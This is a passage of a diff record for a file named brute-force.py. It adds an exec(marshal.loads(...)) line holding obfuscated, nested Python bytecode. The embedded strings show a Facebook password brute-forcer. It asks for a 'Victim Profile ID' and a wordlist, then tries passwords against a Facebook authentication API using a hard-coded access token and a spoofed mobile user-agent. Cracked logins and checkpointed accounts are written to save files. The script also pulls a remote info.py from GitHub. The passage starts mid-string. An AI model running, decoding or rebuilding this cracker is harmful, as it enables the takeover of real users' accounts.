0HTTPRefreshProcessort\\n\\x00\\x00\\x00addheadersR\\x07\\x00\\x00\\x00t\\x07\\x00\\x00\\x00sessiont\\x02\\x00\\x00\\x00rst\\x03\\x00\\x00\\x00gett\\x02\\x00\\x00\\x00rgt\\x04\\x00\\x00\\x00textt\\x01\\x00\\x00\\x00xR+\\x00\\x00\\x00t\\x03\\x00\\x00\\x00aclR\\x0f\\x00\\x00\\x00R\\x10\\x00\\x00\\x00R\\x12\\x00\\x00\\x00R\\x0e\\x00\\x00\\x00t\\x03\\x00\\x00\\x00pclR\\x11\\x00\\x00\\x00t\\x03\\x00\\x00\\x00wclt\\x03\\x00\\x00\\x00mclt\\x03\\x00\\x00\\x00nclt\\x06\\x00\\x00\\x00formatt\\x04\\x00\\x00\\x00warnt\\x04\\x00\\x00\\x00infot\\n\\x00\\x00\\x00PermissionR.\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Truet\\t\\x00\\x00\\x00raw_inputt\\x03\\x00\\x00\\x00Usrt\\x04\\x00\\x00\\x00Usert\\x03\\x00\\x00\\x00psdt\\x03\\x00\\x00\\x00Pwdt\\x04\\x00\\x00\\x00logoR\\x1c\\x00\\x00\\x00t\\x08\\x00\\x00\\x00passlistR)\\x00\\x00\\x00t\\x03\\x00\\x00\\x00strR\\x1b\\x00\\x00\\x00R*\\x00\\x00\\x00t\\x04\\x00\\x00\\x00wordt\\x04\\x00\\x00\\x00filet\\x03\\x00\\x00\\x00lenR1\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x05\\x00\\x00\\x00s\\xa0\\x00\\x00\\x00<\\x02\\x03\\x01\\x10\\x01\\r\\x01\\x11\\x01\\r\\x02\\x03\\x01\\x10\\x01\\r\\x01\\r\\x01\\x10\\x02\\x10\\x01\\x10\\x02\\t\\x07\\x0c\\x01\\r\\x01\\x1c\\x01\\x0c\\x03\\r\\x02\\n\\x01\\r\\x01\\r\\x01\\x0c\\x01\\t\\x01\\x0f\\x01\\x08\\x06\\x06\\x04\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x07*\\x04$\\x02\\x0c\\x01\\x03\\x02\\x0e\\x01\\r\\x01\\r\\x01\\x07\\x02\\t\\x01\\r\\x01\\n\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x04\\x02\\x0e\\x01\\x10\\x02\\x0e\\x01\\x11\\x02\\r\\x01\\x05\\x01\\n\\x01\\x10\\x01\\x10\\x01\\x06\\x01\\x18\\x01\\x15\\x02\\x12\\x01\\x12\\x01\\x1e\\x06\\t%(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02'))\n\\ No newline at end of file\n+#Compylied By Noob-Hacker71 \n+exec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00e\\r\\x00_\\x13\\x00e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00d\\r\\x00\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d\\x0e\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x05\\x00j\\x15\\x00\\x83\\x00\\x00Z\\x16\\x00e\\x16\\x00j\\x17\\x00Z\\x18\\x00e\\x18\\x00d\\x0f\\x00\\x83\\x01\\x00j\\x19\\x00Z\\x1a\\x00e\\x1a\\x00d\\x01\\x00\\x04Ug\\x00\\x00Z\\x1b\\x00d\\x10\\x00Z\\x1c\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x1a\\x00j&\\x00d\\x1b\\x00e \\x00d\\x1c\\x00e\\x1d\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00d\\x1f\\x00e\\x1f\\x00\\x83\\x00\\x05Z\\'\\x00d \\x00j&\\x00d\\x1c\\x00e\\x1d\\x00d\\x1f\\x00e\\x1f\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00\\x83\\x00\\x04Z(\\x00e)\\x00d!\\x00k\\x02\\x00rS\\x02n\/\\x00e\\x0c\\x00e\"\\x00d\"\\x00\\x17\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d#\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d$\\x00\\x83\\x01\\x00\\x01e*\\x00\\x83\\x00\\x00\\x01x\\xb2\\x00e+\\x00r6\\x03e\\x00\\x00j\\x07\\x00d%\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00e\\'\\x00\\x83\\x01\\x00\\x01e,\\x00e \\x00d&\\x00\\x17\\x83\\x01\\x00Z-\\x00e-\\x00e.\\x00k\\x02\\x00r\\x18\\x03e\\x0c\\x00e\\x1e\\x00d\\'\\x00\\x17\\x83\\x01\\x00\\x01e,\\x00e\\x1f\\x00d(\\x00\\x17\\x83\\x01\\x00Z\/\\x00e\/\\x00e0\\x00k\\x02\\x00r\\xfa\\x02e\\x0c\\x00e\\x1e\\x00d)\\x00\\x17\\x83\\x01\\x00\\x01Pq3\\x03e\\x0c\\x00e\\x1d\\x00d*\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02e\\x0c\\x00e\\x1d\\x00d+\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02We\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e1\\x00GHe\\x0c\\x00e(\\x00\\x83\\x01\\x00\\x01e,\\x00e\"\\x00d,\\x00\\x17\\x83\\x01\\x00Z2\\x00e,\\x00e \\x00d-\\x00\\x17\\x83\\x01\\x00Z3\\x00e3\\x00Z4\\x00e\\x0c\\x00e\\x1e\\x00d.\\x00\\x17e5\\x00e4\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01e6\\x00e3\\x00d\/\\x00\\x83\\x02\\x00j7\\x00\\x83\\x00\\x00Z8\\x00e6\\x00e4\\x00d\/\\x00\\x83\\x02\\x00\\x8f1\\x00Z9\\x00e:\\x00e9\\x00j7\\x00\\x83\\x00\\x00\\x83\\x01\\x00Z\\x1a\\x00e\\x0c\\x00e\\x1d\\x00d0\\x00\\x17e5\\x00e\\x1a\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01Wd\\x01\\x00QXd1\\x00\\x84\\x00\\x00Z;\\x00e;\\x00\\x83\\x00\\x00\\x01d\\x01\\x00S(3\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x15\\x00\\x00\\x00pip2 install requestss\\x15\\x00\\x00\\x00pkg install figlet -ys\\x16\\x00\\x00\\x00pip2 install mechanize(\\x01\\x00\\x00\\x00t\\n\\x00\\x00\\x00ThreadPool(\\x01\\x00\\x00\\x00t\\x07\\x00\\x00\\x00Browserc\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00C\\x00\\x00\\x00s?\\x00\\x00\\x00x8\\x00|\\x00\\x00D]0\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00j\\x02\\x00|\\x01\\x00\\x83\\x01\\x00\\x01t\\x00\\x00j\\x01\\x00j\\x03\\x00\\x83\\x00\\x00\\x01t\\x04\\x00j\\x05\\x00d\\x01\\x00\\x83\\x01\\x00\\x01q\\x07\\x00Wd\\x00\\x00S(\\x02\\x00\\x00\\x00Ng\\x9a\\x99\\x99\\x99\\x99\\x99\\xa9?(\\x06\\x00\\x00\\x00t\\x03\\x00\\x00\\x00syst\\x06\\x00\\x00\\x00stdoutt\\x05\\x00\\x00\\x00writet\\x05\\x00\\x00\\x00flusht\\x04\\x00\\x00\\x00timet\\x05\\x00\\x00\\x00sleep(\\x02\\x00\\x00\\x00t\\x03\\x00\\x00\\x00argt\\x01\\x00\\x00\\x00i(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00motion\\x16\\x00\\x00\\x00s\\x08\\x00\\x00\\x00\\x00\\x01\\r\\x01\\x10\\x01\\r\\x01t\\x08\\x00\\x00\\x00max_timei\\x01\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;]t\\x05\\x00\\x00\\x00clears&\\x00\\x00\\x00\\x1b[1;33m\\nEverything is getting ready...i\\x03\\x00\\x00\\x00sJ\\x00\\x00\\x00https:\/\/raw.githubusercontent.com\/Noob-Hacker71\/Noob-Hacker71\/main\/info.pys\\x07\\x00\\x00\\x00\\x1b[1;30ms\\x07\\x00\\x00\\x00\\x1b[1;31ms\\x07\\x00\\x00\\x00\\x1b[1;32ms\\x07\\x00\\x00\\x00\\x1b[1;33ms\\x07\\x00\\x00\\x00\\x1b[1;34ms\\x07\\x00\\x00\\x00\\x1b[1;35ms\\x07\\x00\\x00\\x00\\x1b[1;36ms\\x07\\x00\\x00\\x00\\x1b[1;37ms\\x07\\x00\\x00\\x00\\x1b[1;94ms\\x07\\x00\\x00\\x00\\x1b[0;00ms\\xed\\x00\\x00\\x00\\n{ycl}[+] Attacking In Background For Fast Cracking ...\\n{bcl}[+] This A Facebook Password Cracker Script ...\\n{gcl}[+] Attack With Your Custom Wordlist ...\\n{rcl}[+] This Script From Noob-Hacker71 ...\\n{ccl}[+] Use It At Your Own Risk ...\\n\\nt\\x03\\x00\\x00\\x00bclt\\x03\\x00\\x00\\x00rclt\\x03\\x00\\x00\\x00gclt\\x03\\x00\\x00\\x00cclt\\x03\\x00\\x00\\x00ycls\\xd7\\x00\\x00\\x00{rcl}[+] {ycl}Connect A Fast Network For Better Experience..\\n{rcl}[+] {rcl}Don\\'t Use It For Any Illigele Puspose...\\n{rcl}[+] {gcl}For Stop Attack Press CTRL + \\\\ ...\\n--------------------------------------------------t\\x02\\x00\\x00\\x00Ons#\\x00\\x00\\x00You Need Noob-Hacker71\\'s Permissioni\\x02\\x00\\x00\\x00s\/\\x00\\x00\\x00xdg-open https:\/\/www.facebook.com\/ntahsan.nayems\\x1b\\x00\\x00\\x00figlet -f small Brute-Forces\\x13\\x00\\x00\\x00Enter Username =>> s\\x0e\\x00\\x00\\x00\\nCorrect User\\ns\\x13\\x00\\x00\\x00Enter Password =>> s\\x17\\x00\\x00\\x00\\nSuccessfully Logged Ins\\x0f\\x00\\x00\\x00\\nWrong Passwords\\x18\\x00\\x00\\x00\\nWrong User,,,Try Again\\ns\\x1c\\x00\\x00\\x00\\nEnter Victim Profile ID >> s\\x11\\x00\\x00\\x00Wordlist Path >> s\\x0e\\x00\\x00\\x00\\nWordlist =>> t\\x01\\x00\\x00\\x00rs\\x14\\x00\\x00\\x00\\nTotal Password =>> c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x05\\x00\\x00\\x00C\\x00\\x00\\x00s\\xa7\\x00\\x00\\x00y\\x11\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00\\x83\\x01\\x00\\x01Wn\\x11\\x00\\x04t\\x02\\x00k\\n\\x00r$\\x00\\x01\\x01\\x01n\\x01\\x00Xy7\\x00x0\\x00t\\x03\\x00t\\x04\\x00d\\x02\\x00\\x83\\x02\\x00j\\x05\\x00\\x83\\x00\\x00D]\\x19\\x00}\\x00\\x00t\\x06\\x00j\\x07\\x00|\\x00\\x00j\\x08\\x00\\x83\\x00\\x00\\x83\\x01\\x00\\x01q>\\x00WWn\\x11\\x00\\x01\\x01\\x01t\\t\\x00d\\x03\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xd\\x04\\x00\\x84\\x00\\x00}\\x01\\x00y \\x00t\\n\\x00d\\x05\\x00\\x83\\x01\\x00}\\x02\\x00|\\x02\\x00j\\x0b\\x00|\\x01\\x00t\\x06\\x00\\x83\\x02\\x00\\x01Wn\\x07\\x00\\x01\\x01\\x01n\\x01\\x00Xd\\x00\\x00S(\\x06\\x00\\x00\\x00Nt\\x04\\x00\\x00\\x00saveR\\x14\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Exitc\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\\x00\\x00\\x00S\\x00\\x00\\x00s\\xfe\\x00\\x00\\x00|\\x00\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00t\\x02\\x00\\x17d\\x02\\x00\\x17|\\x01\\x00\\x17d\\x03\\x00\\x17\\x83\\x01\\x00}\\x02\\x00t\\x03\\x00j\\x04\\x00|\\x02\\x00\\x83\\x01\\x00}\\x03\\x00d\\x04\\x00|\\x03\\x00k\\x06\\x00r\\x93\\x00t\\x05\\x00t\\x06\\x00d\\x05\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x08\\x00d\\t\\x00\\x83\\x02\\x00}\\x04\\x00|\\x04\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x04\\x00j\\x08\\x00\\x83\\x00\\x00\\x01ng\\x00d\\x0b\\x00|\\x03\\x00d\\x0c\\x00\\x19k\\x06\\x00r\\xfa\\x00t\\x05\\x00t\\t\\x00d\\r\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17t\\t\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x0e\\x00d\\t\\x00\\x83\\x02\\x00}\\x05\\x00|\\x05\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x05\\x00j\\x08\\x00\\x83\\x00\\x00\\x01n\\x00\\x00d\\x00\\x00S(\\x0f\\x00\\x00\\x00Ns\\x91\\x00\\x00\\x00https:\/\/b-api.facebook.com\/method\/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s\\x17\\x00\\x00\\x00&locale=en_US&password=sH\\x00\\x00\\x00&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt\\x0c\\x00\\x00\\x00access_tokens\\x0b\\x00\\x00\\x00\\n[NOOB_OK] s\\x05\\x00\\x00\\x00  |  s\\x01\\x00\\x00\\x00\\ns\\x18\\x00\\x00\\x00save\/Noob_Successful.txtt\\x01\\x00\\x00\\x00as\\n\\x00\\x00\\x00 [ NOOB ] s\\x10\\x00\\x00\\x00www.facebook.comt\\t\\x00\\x00\\x00error_msgs\\x0b\\x00\\x00\\x00\\n[NOOB_CP] s\\x18\\x00\\x00\\x00save\/Noob_CheckPoint.txt(\\n\\x00\\x00\\x00t\\x02\\x00\\x00\\x00brt\\x04\\x00\\x00\\x00opent\\x06\\x00\\x00\\x00victimt\\x04\\x00\\x00\\x00jsont\\x04\\x00\\x00\\x00loadR\\x0b\\x00\\x00\\x00R\\x11\\x00\\x00\\x00R\\x04\\x00\\x00\\x00t\\x05\\x00\\x00\\x00closeR\\x12\\x00\\x00\\x00(\\x06\\x00\\x00\\x00R\\x08\\x00\\x00\\x00t\\x04\\x00\\x00\\x00linet\\x04\\x00\\x00\\x00datat\\x01\\x00\\x00\\x00qt\\x03\\x00\\x00\\x00okbt\\x03\\x00\\x00\\x00cps(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00main\\x89\\x00\\x00\\x00s\\x1a\\x00\\x00\\x00\\x00\\x01\\x06\\x02\\x1f\\x01\\x0f\\x02\\x0c\\x01\\x1e\\x01\\x0f\\x01\\x19\\x01\\r\\x02\\x10\\x01\"\\x01\\x0f\\x01\\x19\\x01i\\x1e\\x00\\x00\\x00(\\x0c\\x00\\x00\\x00t\\x02\\x00\\x00\\x00ost\\x05\\x00\\x00\\x00mkdirt\\x07\\x00\\x00\\x00OSErrorR\\x1b\\x00\\x00\\x00t\\x03\\x00\\x00\\x00filt\\t\\x00\\x00\\x00readlinest\\x02\\x00\\x00\\x00idt\\x06\\x00\\x00\\x00appendt\\x05\\x00\\x00\\x00stript\\x04\\x00\\x00\\x00exitR\\x00\\x00\\x00\\x00t\\x03\\x00\\x00\\x00map(\\x03\\x00\\x00\\x00R\\t\\x00\\x00\\x00R%\\x00\\x00\\x00t\\x01\\x00\\x00\\x00p(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Noob~\\x00\\x00\\x00s\\x1e\\x00\\x00\\x00\\x00\\x01\\x03\\x01\\x11\\x01\\r\\x01\\x04\\x01\\x03\\x01\\x1c\\x01\\x1b\\x01\\x03\\x01\\x0e\\x02\\t\\x13\\x03\\x01\\x0c\\x01\\x14\\x01\\x03\\x01(\\x02\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;](<\\x00\\x00\\x00R&\\x00\\x00\\x00R\\x02\\x00\\x00\\x00R\\x06\\x00\\x00\\x00t\\x06\\x00\\x00\\x00randomR\\x1d\\x00\\x00\\x00t\\x08\\x00\\x00\\x00requestst\\x0b\\x00\\x00\\x00ImportErrort\\x06\\x00\\x00\\x00systemt\\t\\x00\\x00\\x00mechanizet\\x14\\x00\\x00\\x00multiprocessing.poolR\\x00\\x00\\x00\\x00R\\x01\\x00\\x00\\x00R\\x0b\\x00\\x00\\x00R\\x1a\\x00\\x00\\x00t\\x11\\x00\\x00\\x00set_handle_robotst\\x05\\x00\\x00\\x00Falset\\x12\\x00\\x00\\x00set_handle_refresht\\x05\\x00\\x00\\x00_httpt\\x14\\x00\\x00\\x00HTTPRefreshProcessort\\n\\x00\\x00\\x00addheadersR\\x07\\x00\\x00\\x00t\\x07\\x00\\x00\\x00sessiont\\x02\\x00\\x00\\x00rst\\x03\\x00\\x00\\x00gett\\x02\\x00\\x00\\x00rgt\\x04\\x00\\x00\\x00textt\\x01\\x00\\x00\\x00xR+\\x00\\x00\\x00t\\x03\\x00\\x00\\x00aclR\\x0f\\x00\\x00\\x00R\\x10\\x00\\x00\\x00R\\x12\\x00\\x00\\x00R\\x0e\\x00\\x00\\x00t\\x03\\x00\\x00\\x00pclR\\x11\\x00\\x00\\x00t\\x03\\x00\\x00\\x00wclt\\x03\\x00\\x00\\x00mclt\\x03\\x00\\x00\\x00nclt\\x06\\x00\\x00\\x00formatt\\x04\\x00\\x00\\x00warnt\\x04\\x00\\x00\\x00infot\\n\\x00\\x00\\x00PermissionR.\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Truet\\t\\x00\\x00\\x00raw_inputt\\x03\\x00\\x00\\x00Usrt\\x04\\x00\\x00\\x00Usert\\x03\\x00\\x00\\x00psdt\\x03\\x00\\x00\\x00Pwdt\\x04\\x00\\x00\\x00logoR\\x1c\\x00\\x00\\x00t\\x08\\x00\\x00\\x00passlistR)\\x00\\x00\\x00t\\x03\\x00\\x00\\x00strR\\x1b\\x00\\x00\\x00R*\\x00\\x00\\x00t\\x04\\x00\\x00\\x00wordt\\x04\\x00\\x00\\x00filet\\x03\\x00\\x00\\x00lenR1\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x05\\x00\\x00\\x00s\\xa0\\x00\\x00\\x00<\\x02\\x03\\x01\\x10\\x01\\r\\x01\\x11\\x01\\r\\x02\\x03\\x01\\x10\\x01\\r\\x01\\r\\x01\\x10\\x02\\x10\\x01\\x10\\x02\\t\\x07\\x0c\\x01\\r\\x01\\x1c\\x01\\x0c\\x03\\r\\x02\\n\\x01\\r\\x01\\r\\x01\\x0c\\x01\\t\\x01\\x0f\\x01\\x08\\x06\\x06\\x04\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x07*\\x04$\\x02\\x0c\\x01\\x03\\x02\\x0e\\x01\\r\\x01\\r\\x01\\x07\\x02\\t\\x01\\r\\x01\\n\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x04\\x02\\x0e\\x01\\x10\\x02\\x0e\\x01\\x11\\x02\\r\\x01\\x05\\x01\\n\\x01\\x10\\x01\\x10\\x01\\x06\\x01\\x18\\x01\\x15\\x02\\x12\\x01\\x12\\x01\\x1e\\x06\\t%(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02'))\n","add":2,"remove":2,"filename":"\/brute-force.py","badparts":["exec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00